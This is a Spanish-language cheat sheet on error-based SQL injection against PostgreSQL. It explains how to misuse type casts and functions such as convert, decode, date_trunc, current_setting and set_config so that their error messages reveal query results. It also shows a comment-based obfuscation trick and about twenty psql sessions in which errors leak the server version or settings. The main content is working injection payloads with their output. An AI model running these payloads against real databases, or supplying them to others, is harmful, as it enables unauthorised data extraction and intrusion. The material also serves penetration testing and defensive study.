



# SQLI ERROR 
- El truco esta en usar funciones de postgresql que en alguno de sus parametros permitan pasar texto , por ejemplo la funcion cast 
<br><br>- otro truco es buscar funciones de PostgreSQL que acepten múltiples parámetros y que uno de esos parámetros sea de tipo  texto específico y no arbitrario tenga que cumplir con alguna condicion  , ahi es donde rompes la condicion colocando otro texto que no es, por ejemplo la funcion : convert 
<br><br> - Otro es buscar funciones que acepte un parametro de tipo texto específico y no arbitrario y tenga que cumplir con alguna condicion , por ejemplo la funcion : current_setting 

 



### OFUSCACION
select/*nadaaaaaaaa es puro texto */version/*0a*/(/*989898*/);


# Ejemplo , explotando SQLI ERROR 

```sql
postgres@postgres# SELECT CAST((SELECT version()) AS INTEGER);
ERROR:  invalid input syntax for type integer: "PostgreSQL 16.4 on x86_64-pc-linux-gnu, compiled by gcc (GCC) 8.5.0 20210514 (Red Hat 8.5.0-22), 64-bit"
Time: 0.335 ms

postgres@postgres# select clm::int from (select version() as clm) as s  ;
ERROR:  invalid input syntax for type integer: "PostgreSQL 16.4 on x86_64-pc-linux-gnu, compiled by gcc (GCC) 8.5.0 20210514 (Red Hat 8.5.0-22), 64-bit"
Time: 0.401 ms

postgres@postgres# SELECT RTRIM(clm)::date FROM (SELECT version() AS clm) AS s;
ERROR:  invalid input syntax for type date: "PostgreSQL 16.4 on x86_64-pc-linux-gnu, compiled by gcc (GCC) 8.5.0 20210514 (Red Hat 8.5.0-22), 64-bit"
Time: 0.550 ms


postgres@postgres# SELECT RTRIM(clm)::boolean FROM (SELECT version() AS clm) AS s;
ERROR:  invalid input syntax for type boolean: "PostgreSQL 16.4 on x86_64-pc-linux-gnu, compiled by gcc (GCC) 8.5.0 20210514 (Red Hat 8.5.0-22), 64-bit"
Time: 0.456 ms



postgres@postgres# SELECT ENCODE('a'::bytea, (select  version())) ;
ERROR:  unrecognized encoding: "PostgreSQL 16.4 on x86_64-pc-linux-gnu, compiled by gcc (GCC) 8.5.0 20210514 (Red Hat 8.5.0-22), 64-bit"
Time: 0.413 ms


postgres@postgres# SELECT decode('a', (select version()));
ERROR:  unrecognized encoding: "PostgreSQL 16.4 on x86_64-pc-linux-gnu, compiled by gcc (GCC) 8.5.0 20210514 (Red Hat 8.5.0-22), 64-bit"
Time: 0.411 ms



postgres@postgres# SELECT convert('hola mundo', 'SQL_ASCII', (select  version()));
ERROR:  invalid destination encoding name "PostgreSQL 16.4 on x86_64-pc-linux-gnu, compiled by gcc (GCC) 8"
Time: 0.374 ms


postgres@postgres# SELECT convert('hola mundo', (select  version()), 'UTF8');
ERROR:  invalid source encoding name "PostgreSQL 16.4 on x86_64-pc-linux-gnu, compiled by gcc (GCC) 8"
Time: 0.379 ms


postgres@postgres# SELECT convert_from('a', (select version()));
ERROR:  invalid source encoding name "PostgreSQL 16.4 on x86_64-pc-linux-gnu, compiled by gcc (GCC) 8"
Time: 0.376 ms


postgres@postgres# SELECT convert_to('a', (select version()));
ERROR:  invalid destination encoding name "PostgreSQL 16.4 on x86_64-pc-linux-gnu, compiled by gcc (GCC) 8"
Time: 0.399 ms




postgres@postgres# SELECT DATE_TRUNC((select version()), TIMESTAMP '2024-09-24 16:34:59') ;
ERROR:  unit "postgresql 16.4 on x86_64-pc-linux-gnu, compiled by gcc (gcc) 8" not recognized for type timestamp without time zone
Time: 0.349 ms


postgres@postgres# SELECT DATE_PART((select version()), TIMESTAMP '2017-09-30');
ERROR:  unit "postgresql 16.4 on x86_64-pc-linux-gnu, compiled by gcc (gcc) 8" not recognized for type timestamp without time zone
Time: 0.479 ms



postgres@postgres# SELECT TO_DATE((SELECT '->'||setting||'<-' FROM PG_SETTINGS WHERE NAmE = 'server_version'), 'Month DD, YYYY');
ERROR:  invalid value "->16.4<-" for "Month"
DETAIL:  The given value did not match any of the allowed values for this field.
Time: 1.660 ms

 
 



postgres@postgres# SELECT TO_TIMESTAMP(clm, 'YYY-MM-DD') FROM (select version() as clm) AS s;
ERROR:  invalid value "Pos" for "YYY"
DETAIL:  Value must be an integer.
Time: 0.395 ms

 

postgres@postgres# SELECT set_config((select version()), '', false);
ERROR:  invalid configuration parameter name "PostgreSQL 16.4 on x86_64-pc-linux-gnu, compiled by gcc (GCC) 8.5.0 20210514 (Red Hat 8.5.0-22), 64-bit"
DETAIL:  Custom parameter names must be two or more simple identifiers separated by dots.
Time: 0.370 ms



postgres@postgres# select current_setting((select version()));
ERROR:  unrecognized configuration parameter "PostgreSQL 16.4 on x86_64-pc-linux-gnu, compiled by gcc (GCC) 8.5.0 20210514 (Red Hat 8.5.0-22), 64-bit"
Time: 0.408 ms


postgres@postgres#  SELECT regexp_replace('Hola 123 mu,ndo', '[a-zA-Z0-9\s]', '', (select version()));
ERROR:  invalid regular expression option: "P"
Time: 0.365 ms




postgres@postgres# SELECT pg_stat_reset_shared((select version()));
ERROR:  unrecognized reset target: "PostgreSQL 16.4 on x86_64-pc-linux-gnu, compiled by gcc (GCC) 8.5.0 20210514 (Red Hat 8.5.0-22), 64-bit"
HINT:  Target must be "archiver", "bgwriter", "io", "recovery_prefetch", or "wal".
Time: 0.401 ms

```


 
 
# Bibliografia 

-- Proyecto donde muestran varios SQLI 
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection





 
  
